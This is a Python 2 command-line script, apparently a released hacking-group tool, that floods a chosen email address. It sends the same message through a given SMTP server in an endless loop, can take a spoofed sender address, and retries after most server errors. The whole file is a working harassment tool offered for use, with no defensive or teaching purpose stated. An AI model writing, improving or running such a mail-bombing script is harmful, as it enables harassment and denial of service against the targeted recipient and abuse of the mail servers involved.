#!/usr/bin/python

# - Spammer-Email
# | Author: P4kL0nc4t
# | Date: 13/11/2017
# | Editing author will not make you the real coder :)

import argparse
import requests
import time
import datetime
import random
import string
import smtplib

print """\
+-+-+-+-+-+-+-+ Email spammer
|S|p|a|m|m|e|r| Author: P4kL0nc4t
+-+-+-+-+-+-+-+ {Version: 1.0}
"""
parser = argparse.ArgumentParser(description="Spammer (Email) is a tool used to spam an email address by sending an email repeatedly using an SMTP server.", epilog="If you had stuck, you can mail me at p4kl0nc4t@obsidiancyberteam.id")
parser.add_argument("to", metavar="to", help="the email address to spam")
parser.add_argument("subject", help="body of the email to send")
parser.add_argument("body", help="body of the email to send")
parser.add_argument("frommail", metavar="from", help="mail from. Not all SMTP server accepts this, prefer using provided email address")
parser.add_argument("host", help="the SMTP server host")
parser.add_argument("port", type=int, help="the SMTP server port")
parser.add_argument("--ssl", help="the SMTP server requires SSL", action="store_true")
parser.add_argument("--username", help="username for SMTP server auth")
parser.add_argument("--password", help="password for SMTP server auth")
args = parser.parse_args()

def showstatus(message, type="new"):
	now = datetime.datetime.now().strftime("%H:%M:%S")
	icon = "*"
	if type == "warn":
		icon = "!"
	elif type == "new":
		icon == "*"
	message = "[" + icon + "][" + now + "]" + message
	return message

def wrapsbrace(string, endspace=False):
	if endspace == True:
		return "[" + string + "] "
	else:
		return "[" + string + "]"
def sleep(x):
	try:
		time.sleep(x)
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .", "warn")
		exit()
def main():
	print showstatus(wrapsbrace("spammer-init", True) + "Spammer target: {}".format(args.to))
	print showstatus(wrapsbrace("info", True) + "Message length: {}".format(str(len(args.body))))
	i = 1
	while True:
		try:
			server = smtplib.SMTP(host=args.host, port=args.port)
			if args.ssl:
				server = smtplib.SMTP_SSL(host=args.host, port=args.port)
			if args.username and args.password:
				server.login(args.username, args.password)
			message = "Subject: {}\r\n\r\n{}".format(args.subject, args.body)
			server.sendmail(args.frommail, args.to, message)
		except smtplib.SMTPServerDisconnected:
			print showstatus(wrapsbrace("SMTPServerDisconnected", True) + "SMTP server unexpectedly disconnected! Trying again . . .", "warn")
			continue
		except smtplib.SMTPResponseException as e:
			print showstatus(wrapsbrace("SMTPResponseException", True) + "SMTP error code: {}, trying again . . .".format(e.smtp_code), "warn")
			continue
		except smtplib.SMTPSenderRefused:
			print showstatus(wrapsbrace("SMTPSenderRefused", True) + "Sender address refused! Exiting . . .", "warn")
			exit()
		except smtplib.SMTPRecipientsRefused:
			print showstatus(wrapsbrace("SMTPRecipientsRefused", True) + "Recipient address refused! Exiting . . .", "warn")
			exit()
		except smtplib.SMTPDataError:
			print showstatus(wrapsbrace("SMTPDataError", True) + "The SMTP server refused to accept the message data! Exiting . . .", "warn")
			exit()
		except smtplib.SMTPConnectError:
			print showstatus(wrapsbrace("SMTPConnectError", True) + "Error while establishing connection with server! Exiting . . .", "warn")
			exit()
		except smtplib.SMTPHeloError:
			print showstatus(wrapsbrace("SMTPHeloError", True) + "The server refused our HELO message! Exiting . . .", "warn")
			exit()
		except smtplib.SMTPAuthenticationError:
			print showstatus(wrapsbrace("SMTPAuthenticationError", True) + "SMTP credential authentication error! Exiting . . .", "warn")
			exit()
		else:
			print showstatus(wrapsbrace("sent", True) + "Mail sent! increment:{}".format(i))
			i += 1
	try:
		server.quit()
	except:
		exit()
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print "\r" + showstatus(wrapsbrace("except", True) + "KeyboardInterrupt thrown! Exiting . . .")
		exit()
